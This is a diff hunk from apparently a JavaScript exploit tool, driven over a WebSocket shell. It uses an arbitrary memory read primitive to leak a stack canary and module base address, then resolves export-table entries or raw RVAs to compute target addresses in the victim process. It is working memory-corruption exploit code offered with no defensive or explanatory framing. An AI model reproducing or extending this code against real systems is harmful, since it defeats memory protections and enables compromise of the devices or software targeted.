@@ -5760,12 +5760,19 @@ function _startWsShell(){
           TW('4 canary=0x'+can.toString(16));
           if(!(can>0x1000000n)){reply.err='canary fail';break;}
           reply.base='0x'+B.toString(16);
-          /* read the export entry #msg.idx */
+          /* read the export entry #msg.idx - OR use msg.rva directly
+           * (the internal stubs 0x3B0/0x3F0 are NOT export entries!) */
           var tbl=B+0x48000n;
           var idx=parseInt(msg.idx)||49;
-          var e1=S.absRead(tbl+BigInt(0xC+idx*8),8)[0];
-          var sR=Number(e1&0xFFFFFFFFn);
-          var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+          var txt;
+          if(msg.rva){
+            txt=parseInt(msg.rva,16);
+            TW('5r RAW RVA 0x'+txt.toString(16));
+          }else{
+            var e1=S.absRead(tbl+BigInt(0xC+idx*8),8)[0];
+            var sR=Number(e1&0xFFFFFFFFn);
+            txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+          }
           var target=B+BigInt(txt);
           TW('5 idx='+idx+' text=0x'+txt.toString(16)+' target=0x'+target.toString(16));
           reply.idx=idx;
